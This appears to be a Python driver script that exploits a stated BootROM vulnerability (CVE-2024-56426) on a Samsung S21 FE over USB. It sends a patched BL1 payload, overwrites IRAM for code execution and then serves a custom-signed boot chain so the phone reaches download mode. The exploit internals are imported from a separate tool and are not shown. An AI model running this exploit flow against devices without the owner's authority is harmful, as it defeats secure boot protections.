#!/usr/bin/env python3
"""One-shot EUB session driver for the S21 FE (S5E9840) unlock flow.

Drives houston's exploit modules for the CVE-2024-56426 (EUB) session, then
works around two problems observed with houston's stock CLI on Linux with the
0x1100 "new DNW" BootROM:

  1. houston's post-exploit find_device spins forever: the payload
     re-initializes the USB stack *in place* (no bus re-enumeration), so the
     stale interface claim from the pre-exploit handle blocks re-claiming
     (EBUSY loop). Fix: release the claim right after the exploit, then
     re-find/re-claim on a fresh handle.
  2. houston then only pushes files in a fixed order; the BootROM download
     loop is request-driven ("\neub:req: <name>"). Fix: serve each request
     with the matching image.

The BL1 sent as the exploit payload embeds 9840_boot_custom_key_ours.bin
(the shipped payload with OUR efuse data patched in at +0x130), so the
BootROM's BL1 verification (key ptr at 0x0202006c) matches the chain signed
with OUR fresh keys.
"""

import sys
import time

sys.path.insert(0, "houston")

import usb.core
import usb.util

from modules.eub import load_file, write_header, calculate_checksum
from modules.exploit import send_payload, overwrite_iram
from modules.usb_helper import read_bytes

SOC = {"rx_address": 0x02024000, "usb_struct_offset": 0x0480}

# name -> image; order is the documented chain order, but we serve on request
FILES = {
    "bl1": "output/sboot/bl1.bin",
    "epbl": "output/sboot/epbl.bin",
    "bl2": "output/sboot/bl2.bin",
    "bootload": "output/sboot/bootload.bin",
    "el3_mon": "output/sboot/el3_mon.bin",
    "ldfw": "output/ldfw/ldfw.bin",
    "tzsw": "output/tzsw/tzsw.bin",
}


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def find_and_claim(timeout_s=60, expect_pids=(0x1234, 0x1100)):
    dev = None
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        for pid in expect_pids:
            dev = usb.core.find(idVendor=0x04e8, idProduct=pid)
            if dev is not None:
                try:
                    dev.get_active_configuration()
                    break
                except Exception:
                    dev = None
        if dev is not None:
            break
        time.sleep(0.5)
    if dev is None:
        raise SystemExit("device not found (expected an EUB 04e8:1100 device)")

    if dev.is_kernel_driver_active(0):
        dev.detach_kernel_driver(0)
    usb.util.claim_interface(dev, 0)
    if dev.idProduct == 0x1100:
        # same CDC setup houston's find_device does for the new DNW
        dev.ctrl_transfer(0x21, 0x20, 0, 0, bytes([0x00, 0xC2, 0x01, 0x00, 0x00, 0x00, 0x08]))
        dev.ctrl_transfer(0x21, 0x22, 0x0003, 0, None)
    return dev


def dnw_send(dev, path):
    file = load_file(path)
    size = len(file)
    write_header(file, size)
    calculate_checksum(file)
    ret = dev.write(2, file, timeout=5000)
    ok = ret == size
    log(f"    -> sent {path} ({size} bytes): {'OK' if ok else 'SHORT WRITE'}")
    return ok


def read_request(dev, wait_s=1.0):
    """Read one '\neub:req:' request (chunks terminated by a 1-byte read)."""
    req = b""
    deadline = time.time() + wait_s
    while time.time() < deadline:
        chunk = read_bytes(dev)
        if chunk:
            req += chunk
            if len(chunk) == 1:
                return req
        else:
            if req:
                return req
    return req or None


def main():
    log("stage 1: waiting for EUB device (04e8:1100)")
    dev = find_and_claim()
    log(f"device: {dev.idVendor:04x}:{dev.idProduct:04x} (bus {dev.bus} addr {dev.address})")

    log("stage 2: exploit (payload = bl1 with our efuse + embedded custom_key)")
    send_payload(dev, FILES["bl1"])
    overwrite_iram(dev, False, SOC["rx_address"], SOC["usb_struct_offset"])
    log("exploit done (ACE)")

    log("stage 3: release stale claim, re-find, re-claim (in-place USB re-init)")
    try:
        usb.util.release_interface(dev, 0)
    except Exception as e:
        log(f"    release_interface: {e}")
    try:
        usb.util.dispose_resources(dev)
    except Exception:
        pass
    dev = None
    time.sleep(2)
    dev = find_and_claim(timeout_s=30)
    log(f"re-claimed: {dev.idVendor:04x}:{dev.idProduct:04x}")

    log("stage 4: serving file requests")
    served = []
    quiet_deadline = time.time() + 25  # if no requests come, try README order
    overall_deadline = time.time() + 600
    while time.time() < overall_deadline:
        # device changed state (chain booted to download mode)?
        if len(served) >= len(FILES):
            log("all chain images served")
            break
        try:
            req = read_request(dev, wait_s=2.0)
        except usb.core.USBError as e:
            log(f"USB error while reading: {e}")
            break
        if req:
            log(f"  <- {req!r}")
            name = next((n for n in FILES if n.encode() in req), None)
            if name is None:
                # houston's own parsing, for reference
                try:
                    parsed = req.decode()[18:-1]
                except Exception:
                    parsed = "?"
                log(f"    unrecognized request (houston parse: {parsed!r}) — stopping")
                break
            if name in served:
                log(f"    duplicate request for {name} — stopping")
                break
            dnw_send(dev, FILES[name])
            served.append(name)
            quiet_deadline = time.time() + 25
            continue
        if time.time() > quiet_deadline:
            # no requests pending: fall back to pushing the rest in order
            next_name = next(n for n in FILES if n not in served)
            log(f"    no request pending; pushing next in order: {next_name}")
            dnw_send(dev, FILES[next_name])
            served.append(next_name)
            quiet_deadline = time.time() + 25
    log(f"served: {served}")

    log("stage 5: watching for chain boot / download-mode state change (30s)")
    seen = set()
    deadline = time.time() + 30
    while time.time() < deadline:
        for pid in (0x685D, 0x1234, 0x1100):
            d = usb.core.find(idVendor=0x04e8, idProduct=pid)
            if d is not None:
                key = (d.bus, d.address, pid)
                if key not in seen:
                    seen.add(key)
                    log(f"    USB device present: 04e8:{pid:04x} bus {d.bus} addr {d.address}")
                    if pid == 0x685D:
                        log("download mode (Odin PID 04e8:685d) is up — session complete")
                        return
        time.sleep(1)
    log("stage 5 done — check lsusb for the download-mode device for the download-mode device")


if __name__ == "__main__":
    main()
